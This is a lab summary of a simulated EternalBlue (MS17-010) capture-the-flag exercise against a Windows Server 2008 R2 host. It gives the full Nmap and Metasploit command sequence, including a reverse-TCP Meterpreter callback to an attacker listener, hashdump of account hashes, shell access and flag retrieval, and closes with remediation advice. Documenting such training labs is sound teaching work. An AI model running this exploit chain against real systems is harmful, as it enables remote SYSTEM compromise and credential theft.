# M04 | EternalBlue MS17-010: Lab Summary

**Mission:** M04 // CRITICAL  
**Scenario:** ACME Corp, Floor 1 test lab  
**Outcome:** **Completed (4/4 steps)**  
**Target:** `192.168.1.80`  
**Operating system:** Windows Server 2008 R2 Standard, build 7601, Service Pack 1  
**Service:** SMB over `445/tcp` (SMBv1)  
**Vulnerability:** MS17-010 / CVE-2017-0144 (EternalBlue)  
**Post-exploitation identity:** `NT AUTHORITY\SYSTEM`  
**Flag:** `214dae3db728a5f016f8ffaaea45e628`  
**Lab flag file on Kali:** `~/flags/flag3.txt`

> **Scope and evidence:** This report records the commands and outputs shown by the M04 training simulator. Some outputs are replayed or simplified, and the simulator sometimes presents Meterpreter or Windows-shell commands at an `msf6 >` prompt. Such display conventions are not necessarily representative of a real Metasploit session.

---

## Step 1 of 4 | Vulnerability assessment using Nmap

### Objective

Check whether the target's SMBv1 service exhibits the behavior associated with MS17-010 **before** attempting exploitation. The Nmap script is a vulnerability check, not a remote-code-execution payload.

### Command used

```bash
sudo nmap -p 445 --script smb-vuln-ms17-010 192.168.1.80
```

### Parameter reference

| Component | Description |
|---|---|
| `sudo` | Run Nmap with elevated privileges. |
| `nmap` | Network discovery and service assessment tool. |
| `-p 445` | Limit the scan to TCP port 445, used for direct-hosted SMB. |
| `--script smb-vuln-ms17-010` | Run the Nmap NSE test for the MS17-010 SMB vulnerability. |
| `192.168.1.80` | The in-scope Windows Server target. |

### Recorded response

```text
Starting Nmap -- smb-vuln-ms17-010 check on 192.168.1.80
Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0144
|     Risk factor: HIGH
|       A critical vulnerability in SMBv1 allows remote attackers
|       to execute arbitrary code via a crafted packet.
Nmap done: 1 IP scanned in 5.23 seconds
[note] VULNERABLE confirmed. Safe non-destructive check complete.
       Next: launch msfconsole to exploit.
[+] Step 1/4 complete! Proceed to step 2.
```

### Interpretation

- The NSE probe returned **`State: VULNERABLE`** and **`CVE-2017-0144`**.
- This supported moving from vulnerability confirmation to the authorized lab exploitation stage.
- A vulnerability scanner's result is evidence of likely exposure, but it is distinct from proving code execution; that proof came in Step 4.

---

## Step 2 of 4 | Metasploit startup and module discovery

### Objective

Start the Metasploit Framework and locate the exploit and scanner modules associated with MS17-010.

### Commands used

```text
msfconsole
search ms17_010
```

The first command runs in the Kali shell; the second is entered at the Metasploit prompt.

### Parameter reference

| Command / parameter | Description |
|---|---|
| `msfconsole` | Launch the interactive Metasploit console. |
| `search` | Find Metasploit modules by keyword. |
| `ms17_010` | Search term used to locate modules for MS17-010. |

### Recorded response (abridged)

```text
=[ metasploit v6.3.44-dev                    ]
+ -- --=[ 2376 exploits - 1232 auxiliary - 416 post]
+ -- --=[ 1390 payloads - 46 encoders - 11 nops ]
+ -- --=[ 9 evasion                             ]
msf6 >
[+] Step 2/4 complete! Proceed to step 3.

msf6 > search ms17_010
Matching Modules
================
#  Name                                        Disclosure Date  Rank       Check
0  exploit/windows/smb/ms17_010_eternalblue    2017-03-14       excellent  Yes
1  auxiliary/scanner/smb/smb_ms17_010          2017-03-14       normal     Yes
```

### Interpretation

- **Exploit module:** `exploit/windows/smb/ms17_010_eternalblue`.
- **Detection module:** `auxiliary/scanner/smb/smb_ms17_010`.
- The EternalBlue module was listed with **`excellent`** rank and **`Check: Yes`**. This is a framework reliability classification, not a guarantee that every target can be exploited.

---

## Step 3 of 4 | Exploit configuration and target selection

### Objective

Load the EternalBlue module, point it at the target, configure the reverse connection back to Kali, and inspect module options.

### Commands used

```text
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.80
set LHOST 10.10.10.5
set PAYLOAD windows/x64/meterpreter/reverse_tcp
show options
```

### Command and option reference

| Command / option | Meaning | Lab value / behavior |
|---|---|---|
| `use` | Select an exploit module in Metasploit. | `exploit/windows/smb/ms17_010_eternalblue` |
| `RHOSTS` | Remote host(s) to target. | `192.168.1.80` |
| `LHOST` | IP address where the reverse connection should arrive. | `10.10.10.5` |
| `RPORT` | Remote SMB service port. | `445` (module default) |
| `LPORT` | Local listening port for the reverse connection. | `4444` (module default) |
| `PAYLOAD` | Code to run after successful exploitation. | `windows/x64/meterpreter/reverse_tcp`, selected as the simulator's module default |
| `show options` | Display the module's configurable settings. | Used to inspect required fields and defaults. |

### Recorded response

```text
msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(ms17_010_eternalblue) >
[note] Module loaded. Set RHOSTS and LHOST then run.

msf6 > set RHOSTS 192.168.1.80
RHOSTS => 192.168.1.80

msf6 > set LHOST 10.10.10.5
LHOST => 10.10.10.5
[+] RHOSTS=192.168.1.80 LHOST=10.10.10.5 -- ready to run

msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
Unknown command. Type 'help' for available commands.

msf6 > show options
Module options (exploit/windows/smb/ms17_010_eternalblue):
   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s)
   RPORT   445              yes       The target port (TCP)
   LHOST                    yes       The listen address
   LPORT   4444             yes       The listen port
[+] Step 3/4 complete! Proceed to step 4.
```

### Interpretation and simulator quirks

- Both `RHOSTS` and `LHOST` received successful assignment confirmations.
- `set PAYLOAD ...` produced **`Unknown command`** in the simulator, but the desired Meterpreter payload had already been selected by default when the exploit was loaded.
- The `show options` display left `RHOSTS` and `LHOST` visually blank even though their earlier assignment responses confirmed the values. The lab still marked **Step 3 complete**.
- The important network condition is that `192.168.1.80` can reach the callback listener on `10.10.10.5:4444`.

---

## Step 4 of 4 | Exploitation, privilege verification, and flag retrieval

### Objective

Execute the configured module, establish the Metasploit session, verify Windows privileges, and retrieve the mission flag from `C:\flag.txt`.

### Commands used

```text
run
getuid
hashdump
shell
type C:\flag.txt
```

### Command reference

| Command | Purpose |
|---|---|
| `run` | Execute the loaded EternalBlue exploit module. |
| `getuid` | Display the account identity under which the remote session runs. |
| `hashdump` | Dump locally available Windows password hashes in the lab; **not necessary** for reading the flag. |
| `shell` | Spawn a Windows command shell from Meterpreter. |
| `type C:\flag.txt` | Print the contents of the mission flag file. |

In a normal interactive Metasploit workflow, `run` is entered at the module prompt, `getuid`, `hashdump`, and `shell` are Meterpreter commands, and `type C:\flag.txt` is a Windows `cmd.exe` command. The lab simulator displayed several of these at an `msf6 >` prompt.

### Recorded exploit response (abridged)

```text
msf6 > run
[replay] Step 3 already complete:
[*] Started reverse TCP handler on 10.10.10.5:4444
[*] 192.168.1.80:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.1.80:445 - Host is likely VULNERABLE to MS17-010!
[*] 192.168.1.80:445 - Target OS: Windows Server 2008 R2 Standard 7601 SP1
[+] 192.168.1.80:445 - Connection established for exploitation.
[*] 192.168.1.80:445 - Sending total of 71 fragments...
[*] 192.168.1.80:445 - Triggering free of corrupted buffer.
[*] 192.168.1.80:445 - Sending egg -- 102400 bytes...
[*] Sending stage (201798 bytes) to 192.168.1.80
[*] Meterpreter session 1 opened (10.10.10.5:4444 -> 192.168.1.80:49203) at 2024-03-15 09:18:03
[!] NT AUTHORITY\SYSTEM shell established on Windows Server 2008 R2
```

### Recorded privilege and shell output

```text
msf6 > getuid
Server Username: NT AUTHORITY\SYSTEM
[note] Highest privilege confirmed. Next, dump hashes with 'hashdump'.

msf6 > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:c889105d1f0f4a31e5a7b5e01a0e21a5:::

msf6 > shell
Process 1 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
C:\Windows\system32>
```

**Note:** The hash lines above are the **lab's simulated output**. They are account credential material; do not include real password hashes in a publicly distributed report unless specifically required.

### Recorded flag retrieval

```text
msf6 > type C:\flag.txt
214dae3db728a5f016f8ffaaea45e628
[!] Mission complete: EternalBlue delivered NT AUTHORITY\SYSTEM and flag access.
flag captured: 214dae3db728a5f016f8ffaaea45e628
saved to ~/flags/flag3.txt
[+] Mission M04 complete: EternalBlue MS17-010
```

### Interpretation

1. The exploit produced a **Meterpreter session** connected to `192.168.1.80`.
2. `getuid` confirmed **`NT AUTHORITY\SYSTEM`**, the local Windows SYSTEM security context.
3. `hashdump` returned three simulated account hash records, demonstrating the exposure of credentials after a privileged compromise.
4. `shell` opened a Windows command-shell channel.
5. `type C:\flag.txt` returned the expected flag and the simulator reported **Mission M04 complete**.

---

## Consolidated command reference

| Step | Command | Observed result |
|---|---|---|
| 1. Vulnerability assessment | `sudo nmap -p 445 --script smb-vuln-ms17-010 192.168.1.80` | `State: VULNERABLE` for `CVE-2017-0144` |
| 2. Framework initialization | `msfconsole` | Metasploit v6.3.44-dev loaded |
| 2. Module discovery | `search ms17_010` | EternalBlue exploit and MS17-010 scanner found |
| 3. Module selection | `use exploit/windows/smb/ms17_010_eternalblue` | Exploit loaded; Meterpreter payload chosen by default |
| 3. Target configuration | `set RHOSTS 192.168.1.80` | Target assignment confirmed |
| 3. Callback configuration | `set LHOST 10.10.10.5` | Callback assignment confirmed |
| 3. Optional payload selection | `set PAYLOAD windows/x64/meterpreter/reverse_tcp` | Rejected by simulator; default already selected |
| 3. Inspect configuration | `show options` | Port defaults shown; simulator accepted step |
| 4. Exploit | `run` | Meterpreter session 1 opened |
| 4. Verify privileges | `getuid` | `NT AUTHORITY\SYSTEM` |
| 4. Inspect credential hashes | `hashdump` | Three simulated hash records returned |
| 4. Command shell | `shell` | Windows `cmd.exe` channel opened |
| 4. Retrieve flag | `type C:\flag.txt` | Flag returned and saved in lab |

## Key lessons and findings

- **Finding 1: Unpatched SMBv1.** The target was positively identified by the lab's MS17-010 check as exposed to EternalBlue.
- **Finding 2: Remote SYSTEM execution.** Exploitation established a Meterpreter session and the identity check returned `NT AUTHORITY\SYSTEM`.
- **Finding 3: Credential exposure.** Privileged access enabled retrieval of local password hashes. This illustrates a potential path to subsequent credential-based attacks, although no lateral movement was performed in M04.
- **Finding 4: Sensitive-file access.** The session could read `C:\flag.txt`, fulfilling the mission objective.
- **Remediation principle:** Apply the MS17-010 security updates, remove or disable SMBv1, restrict SMB reachability, and segment legacy hosts from unnecessary access paths.

## Final result

| Field | Value |
|---|---|
| Mission | **M04: EternalBlue MS17-010** |
| Status | **Completed, 4/4 steps** |
| Target | `192.168.1.80` |
| Vulnerability | `CVE-2017-0144` / MS17-010 |
| Exploit module | `exploit/windows/smb/ms17_010_eternalblue` |
| Session | Meterpreter session 1 |
| Confirmed identity | `NT AUTHORITY\SYSTEM` |
| Flag location | `C:\flag.txt` |
| Captured flag | **`214dae3db728a5f016f8ffaaea45e628`** |
| Saved by simulator | `~/flags/flag3.txt` |

*This is a documentation summary of the authorized M04 training lab, based on the terminal responses provided in the exercise.*
